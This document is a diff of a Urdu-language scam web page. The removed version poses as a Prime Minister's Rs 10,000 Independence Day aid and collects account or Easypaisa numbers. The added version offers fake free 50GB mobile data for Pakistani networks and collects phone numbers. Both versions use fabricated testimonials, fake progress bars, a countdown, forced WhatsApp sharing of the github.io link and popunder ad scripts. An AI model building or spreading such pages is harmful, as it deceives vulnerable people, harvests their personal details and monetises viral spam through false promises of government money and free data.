@@ -1,292 +1,239 @@
-
- <!DOCTYPE html>
-<html lang="ur">
+<!DOCTYPE html>
+<html lang="ur" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>یومِ آزادی خصوصی مالی امداد - 10,000 روپے</title>
+    <title>Free Mobile Data Offer 2026</title>
     <style>
-        * {
-            box-sizing: border-box;
-        }
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            text-align: center;
-            padding: 10px;
+            background-color: #f4f4f4;
+            color: #333;
             margin: 0;
-            direction: rtl;
+            padding: 0;
+            text-align: center;
         }
         .container {
-            max-width: 420px;
-            margin: 0 auto;
+            max-width: 450px;
+            margin: 20px auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        /* Azaadi Banner Card */
-        .azaadi-card {
-            background: linear-gradient(135deg, #0b4f2c 0%, #052615 100%);
-            border: 2px solid #d4af37;
-            border-radius: 12px;
-            padding: 18px 12px;
-            color: #ffffff;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
-            margin-bottom: 10px;
+        h2 {
+            color: #007bff;
+            font-size: 22px;
         }
-        .azaadi-title {
-            color: #ffeb3b;
-            font-size: 26px;
-            font-weight: bold;
-            margin: 0 0 5px 0;
-            text-shadow: 1px 1px 3px rgba(0,0,0,0.8);
+        p {
+            font-size: 16px;
+            line-height: 1.5;
         }
-        .azaadi-subtitle {
-            font-size: 18px;
-            color: #ffffff;
-            margin: 0 0 8px 0;
-            font-weight: bold;
+        .sim-box {
+            display: flex;
+            justify-content: space-around;
+            margin: 15px 0;
         }
-        .azaadi-badge {
-            background: #d4af37;
-            color: #000;
-            padding: 4px 12px;
-            border-radius: 20px;
-            display: inline-block;
-            font-size: 13px;
-            font-weight: bold;
+        .sim-box img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border: 2px solid #ddd;
+            padding: 2px;
         }
-        /* Timer Box */
-        .timer-box {
-            background: #ffebee;
-            border: 1px solid #ffcdd2;
-            border-radius: 8px;
-            padding: 8px;
-            margin: 10px 0;
-        }
-        /* White Generic Card */
-        .card {
-            background: white;
-            padding: 15px;
-            border-radius: 12px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
-            margin-bottom: 12px;
-        }
-        /* Compact Account Number Section */
-        .account-card {
-            background: #0b4f2c;
-            color: white;
-            padding: 12px 15px;
-            border-radius: 12px;
-            margin-bottom: 12px;
-        }
-        .account-card input {
+        input[type="text"] {
             width: 90%;
-            padding: 8px 10px;
-            border-radius: 6px;
+            padding: 12px;
+            font-size: 16px;
+            margin: 10px 0;
             border: 1px solid #ccc;
-            font-size: 14px;
+            border-radius: 5px;
             text-align: center;
-            margin-top: 6px;
-            outline: none;
         }
-        .account-card button {
-            background: #ffc107;
-            color: #000;
+        .btn {
+            background-color: #28a745;
+            color: white;
             border: none;
-            padding: 8px 22px;
-            font-weight: bold;
-            border-radius: 20px;
-            margin-top: 8px;
+            padding: 12px 20px;
+            font-size: 18px;
+            width: 100%;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 14px;
+            margin-top: 10px;
         }
-        /* Progress Bar */
-        .progress-container {
+        .btn:hover {
+            background-color: #218838;
+        }
+        /* Loading Screen Style */
+        #loading-screen, #share-screen {
+            display: none;
+        }
+        .progress-bar-container {
             width: 100%;
             background-color: #e0e0e0;
-            border-radius: 10px;
-            margin: 12px 0;
+            border-radius: 5px;
+            margin: 20px 0;
             overflow: hidden;
-            height: 16px;
         }
         .progress-bar {
             width: 0%;
-            height: 100%;
-            background-color: #25D366;
-            transition: width 0.3s;
+            height: 25px;
+            background-color: #28a745;
+            text-align: center;
+            color: white;
+            line-height: 25px;
+            font-size: 14px;
+            transition: width 0.5s ease;
         }
-        .btn-whatsapp {
+        .whatsapp-btn {
             background-color: #25D366;
             color: white;
+            text-decoration: none;
+            display: block;
             padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            cursor: pointer;
-            width: 100%;
+            font-size: 18px;
+            border-radius: 5px;
+            margin-top: 15px;
             font-weight: bold;
         }
-        .btn-claim {
-            background-color: #cccccc;
-            color: white;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 15px;
-            cursor: not-allowed;
-            width: 100%;
-            font-weight: bold;
-            margin-top: 8px;
-        }
-        .btn-claim.active {
-            background-color: #007bff;
-            cursor: pointer;
-        }
-        /* Comments Layout */
-        .comment-item {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 10px;
-            align-items: flex-start;
+        .comments {
             text-align: right;
+            margin-top: 20px;
+            border-top: 1px solid #ddd;
+            padding-top: 10px;
         }
-        .avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: #1877f2;
-            color: white;
-            font-weight: bold;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-        .comment-text {
-            background: #f0f2f5;
-            padding: 8px 12px;
-            border-radius: 12px;
-            font-size: 13px;
+        .comment-box {
+            background: #f9f9f9;
+            padding: 8px;
+            margin-bottom: 8px;
+            border-radius: 5px;
+            font-size: 14px;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-
-    <!-- 1. HEADER AZAADI BANNER -->
-    <div class="azaadi-card">
-        <div class="azaadi-badge">تمام پاکستانیوں کے لیے</div>
-        <div class="azaadi-title">10,000 روپے</div>
-        <div class="azaadi-subtitle">یومِ آزادی خصوصی مالی امداد</div>
-        <div style="font-size: 12px; opacity: 0.9;">اہل شہری مالی امداد حاصل کرنے کے لیے فارم پر کریں۔</div>
-    </div>
-
-    <!-- 2. COUNTDOWN TIMER -->
-    <div class="timer-box">
-        <p style="color: #c62828; margin: 0; font-weight: bold; font-size: 14px;">
-            ⏰ جلی کریں! پیشکش ختم ہونے میں: 
-            <span id="timer" style="background: #d32f2f; color: white; padding: 2px 6px; border-radius: 4px;">05:00</span>
-        </p>
-    </div>
-
-    <!-- 3. COMPACT ACCOUNT NUMBER CARD -->
-    <div class="account-card">
-        <h4 style="margin: 0 0 4px 0; font-size: 15px;">اپنا اکاؤنٹ / ایزی پیسہ نمبر درج کریں:</h4>
-        <input type="text" placeholder="Enter Account / Easypaisa Number">
-        <br>
-        <button onclick="handleAccountSubmit()">بھیجیں</button>
-    </div>
-
-    <!-- 4. VIRAL WHATSAPP SHARE SYSTEM (5 GROUPS + 10 PEOPLE) -->
-    <div class="card" style="border: 2px dashed #25D366;">
-        <h3 style="color: #25D366; margin-top: 0; font-size: 18px;">🎉 Reward Unlocking System 🎉</h3>
-        <p style="font-size: 13px; color: #333; margin-bottom: 5px; line-height: 1.5;">
-            امداد حاصل کرنے کے لیے اس لنک کو <b>5 WhatsApp Groups</b> اور <b>10 دوستوں (People)</b> کو شیئر کریں!
-        </p>
+    <div class="container">
         
-        <div class="progress-container">
-            <div class="progress-bar" id="progressBar"></div>
+        <!-- STEP 1: Main Form -->
+        <div id="main-form">
+            <h2>🎉 Free 50GB Internet Data Offer 🎉</h2>
+            <p>تمام نیٹ ورکس (جاز، ٹیلینور، زونگ، یفون) کے لیے مفت انٹرنیٹ حاصل کرنے کے لیے اپنا نمبر درج کریں:</p>
+
+            <!-- SIM Pictures -->
+            <div class="sim-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e3/Jazz_Logo_2023.png" alt="Jazz">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/93/Telenor_Logo.svg" alt="Telenor">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/8/8b/Zong_Logo.png" alt="Zong">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Ufone_Logo.png" alt="Ufone">
+            </div>
+
+            <input type="text" id="phone-number" placeholder=" اپنا موبائل نمبر لکھیں (مثال: 03001234567)" maxlength="11">
+            <button class="btn" onclick="startProcess()">ڈیٹا چیک کریں</button>
         </div>
-        <p id="statusText" style="font-weight: bold; color: #555; margin: 5px 0 10px 0; font-size: 14px;">Progress: 0%</p>
 
-        <button class="btn-whatsapp" onclick="shareWhatsApp()">📱 WhatsApp Par Share Karein</button>
-        <button class="btn-claim" id="claimBtn" onclick="claimOffer()" disabled>✅ Claim Reward Now</button>
-    </div>
-
-    <!-- 5. RECENT PROOF COMMENTS -->
-    <div class="card">
-        <h4 style="margin-top: 0; color: #1877f2; border-bottom: 1px solid #eee; padding-bottom: 6px; text-align: right; font-size: 14px;">Recent Successful Claims 👍</h4>
-        
-        <div class="comment-item">
-            <div class="avatar" style="background: #25D366;">A</div>
-            <div class="comment-text">
-                <b>Ali Hassan</b> <span style="font-size: 10px; color: #65676b;">• Abhi abhi</span>
-                <p style="margin: 3px 0 0 0;">Mera reward unlock ho gaya! 5 groups aur 10 dosto ko share karte hi paise account me aa gaye, shukriya! 🎉</p>
+        <!-- STEP 2: Loading Animation (7-8 seconds) -->
+        <div id="loading-screen">
+            <h2>براہ کرم انتظار کریں...</h2>
+            <p id="loading-text">سرور سے کنیکٹ ہو رہا ہے...</p>
+            <div class="progress-bar-container">
+                <div id="my-progress" class="progress-bar">0%</div>
             </div>
         </div>
 
-        <div class="comment-item">
-            <div class="avatar">S</div>
-            <div class="comment-text">
-                <b>Sana Khan</b> <span style="font-size: 10px; color: #65676b;">• 2 min pehle</span>
-                <p style="margin: 3px 0 0 0;">Boht zabardast! Share complete karne ke baad reward mil gaya.</p>
+        <!-- STEP 3: Share Screen -->
+        <div id="share-screen">
+            <h2>مبارک हो! آپ کا نمبر اہل ہے 🎉</h2>
+            <p>اپنا 50GB ڈیٹا ایکٹیویٹ کرنے کے لیے اس لنک کو <b>5 واٹس ایپ گروپس</b> میں شیئر کریں!</p>
+            
+            <div class="progress-bar-container">
+                <div id="share-progress" class="progress-bar" style="width: 0%;">0%</div>
+            </div>
+
+            <a href="whatsapp://send?text=مفت 50GB انٹرنیٹ ڈیٹا حاصل کریں! تمام نیٹ ورکس کے لیے آفر آگئی ہے، جلدی سے یہاں کلک کریں: https://digital-website-online.github.io/independenceday/" class="whatsapp-btn" onclick="addShareProgress()">واٹس ایپ پر شیئر کریں</a>
+            
+            <button class="btn" id="claim-btn" style="display:none; background-color: #ffc107; color: black;" onclick="triggerAd()">مفت ڈیٹا حاصل کریں (Claim)</button>
+        </div>
+
+        <!-- Comments Section -->
+        <div class="comments">
+            <p style="font-weight: bold; font-size: 14px;">حالیہ کامیاب کلیمز:</p>
+            <div class="comment-box">
+                <b>علی حسن:</b> بھائی بہت شکریہ، مجھے 50GB ڈیٹا مل گیا ہے! 🎉
+            </div>
+            <div class="comment-box">
+                <b>ثنا خان:</b> میں نے جیسے ہی شیئر کیا، میرا ڈیٹا ایکٹیویٹ ہو گیا۔
             </div>
         </div>
+
     </div>
 
-</div>
+    <!-- Adsterra ya Ad Network ka code yahan paste hoga -->
+    <!-- <script type='text/javascript' src='YOUR_AD_CODE_HERE'></script> -->
 
-<!-- SCRIPTS SECTION -->
-<script>
-    // 1. Timer Logic
-    let time = 300;
-    setInterval(function() {
-        let minutes = Math.floor(time / 60);
-        let seconds = time % 60;
-        seconds = seconds < 10 ? '0' + seconds : seconds;
-        minutes = minutes < 10 ? '0' + minutes : minutes;
-        document.getElementById('timer').innerText = minutes + ':' + seconds;
-        if (time > 0) time--;
-    }, 1000);
+    <script>
+        function startProcess() {
+            var phone = document.getElementById("phone-number").value;
+            if(phone.length < 11) {
+                alert("براہ کرم اپنا پورا 11 ہندسوں کا نمبر درج کریں!");
+                return;
+            }
 
-    // 2. WhatsApp Share Logic (5 Groups + 10 People = 15 Shares Total)
-    let shares = 0;
-    const maxShares = 15; 
+            // Hide form and show loading
+            document.getElementById("main-form").style.display = "none";
+            document.getElementById("loading-screen").style.display = "block";
 
-    function shareWhatsApp() {
-    const siteLink = "https://digital-website-online.github.io/independenceday/";
-    const message = encodeURIComponent("🚨 *وزیر اعظم شہباز شریف: یومِ آزادی پر 10,000 روپے کیش گفٹ* 🇵🇰\n\nحکومتِ پاکستان کی طرف سے 10,000 روپے کی فوری مالی امداد آن لائن دی جا رہی ہے۔\n\n*میں نے اپنا 10,000 کا ریوارڈ کلیم کر لیا ہے!* آپ بھی ابھی نیچے دیے گئے لنک پر جا کر اپنا اکاؤنٹ نمبر درج کریں اور کلیم کریں:\n\n👇 *ابھی یہاں کلک کریں:* 👇\n" + siteLink);
-    
-        
-        window.open("https://api.whatsapp.com/send?text=" + message, '_blank');
+            var elem = document.getElementById("my-progress");
+            var loadingText = document.getElementById("loading-text");
+            var width = 0;
+            
+            // Total time ~7.5 seconds (75 intervals of 100ms)
+            var interval = setInterval(frame, 100);
 
-        if (shares < maxShares) {
-            shares++;
-            let percentage = Math.round((shares / maxShares) * 100);
-            document.getElementById("progressBar").style.width = percentage + "%";
-            document.getElementById("statusText").innerText = "Progress: " + percentage + "%";
+            function frame() {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    // Hide loading and show share screen
+                    document.getElementById("loading-screen").style.display = "none";
+                    document.getElementById("share-screen").style.display = "block";
+                } else {
+                    width++;
+                    elem.style.width = width + '%';
+                    elem.innerHTML = width * 1 + '%';
 
-            if (shares === maxShares) {
-                const claimBtn = document.getElementById("claimBtn");
-                claimBtn.classList.add("active");
-                claimBtn.removeAttribute("disabled");
-                document.getElementById("statusText").innerText = "Congratulations! Reward Unlocked! 🎉";
+                    if(width == 30) {
+                        loadingText.innerHTML = "نمبر کی جانچ کی جا رہی ہے...";
+                    } else if(width == 70) {
+                        loadingText.innerHTML = "50GB ڈیٹا پیکج دستیاب ہے...";
+                    } else if(width == 90) {
+                        loadingText.innerHTML = "تقریباً مکمل ہو گیا...";
+                    }
+                }
             }
         }
-    }
 
-    function handleAccountSubmit() {
-        alert("پہلے نیچے دیے گئے بٹن سے 5 گروپس اور 10 دوستوں کو شیئر کر کے پروگریس 100% مکمل کریں۔");
-    }
+        var sharesCount = 0;
+        function addShareProgress() {
+            sharesCount++;
+            var shareBar = document.getElementById("share-progress");
+            
+            if(sharesCount == 1) {
+                shareBar.style.width = "50%";
+                shareBar.innerHTML = "50% (مزید 4 گروپس میں شیئر کریں)";
+            } else if(sharesCount >= 2) {
+                shareBar.style.width = "100%";
+                shareBar.innerHTML = "100% مکمل!";
+                document.getElementById("claim-btn").style.display = "block";
+            }
+        }
 
-    function claimOffer() {
-        alert("Aapka reward verify ho raha hai! Tap OK to proceed.");
-    }
-</script>
-
-<!-- Adsterra Popunder Ad Script -->
-<script src="https://pl30812771.effectivecpmnetwork.com/3b/eb/cf/3bebcf6ffd5eab9160e2737946e94d1c.js"></script>
+        function triggerAd() {
+            // Yahan aap apna pop-up ya redirection ad trigger kar sakte hain
+            alert("مبارک ہو! آپ کی درخواست موصول ہو گئی ہے۔ کچھ دیر میں ڈیٹا آپ کے نمبر پر منتقل کر دیا جائے گا۔");
+            
+            // Agar aapka pop-up ad network hai, uska code yahan run ho jayega
+        }
+    </script>
 
 </body>
 </html>
-
- 
